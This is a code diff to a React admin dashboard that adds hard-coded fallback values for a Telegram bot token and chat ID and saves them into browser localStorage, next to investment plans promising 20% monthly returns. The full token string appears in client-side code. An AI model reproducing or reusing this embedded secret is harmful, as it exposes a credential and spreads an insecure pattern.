@@ -48,8 +48,18 @@ export default function AdminDashboard() {
     try {
       const storedUsers = JSON.parse(localStorage.getItem("allUsers") || "[]");
       setUsers(storedUsers);
-      setTelegramBotToken(localStorage.getItem("telegramBotToken") || "");
-      setTelegramChatId(localStorage.getItem("telegramChatId") || "");
+      let currentToken = localStorage.getItem("telegramBotToken");
+      let currentChatId = localStorage.getItem("telegramChatId");
+      if (!currentToken) {
+        currentToken = "8606921616:AAGxD4J__zxovB4yZiBtNdZnI-Ljvwytp6c";
+        localStorage.setItem("telegramBotToken", currentToken);
+      }
+      if (!currentChatId) {
+        currentChatId = "8486489983";
+        localStorage.setItem("telegramChatId", currentChatId);
+      }
+      setTelegramBotToken(currentToken);
+      setTelegramChatId(currentChatId);
 
       const defaultPlans = [
         { id: "diamond", name: "Diamond Plan", roi: "20%", minDeposit: 500, depositType: "fixed", fixedAmount: 500, duration: "1 month" },
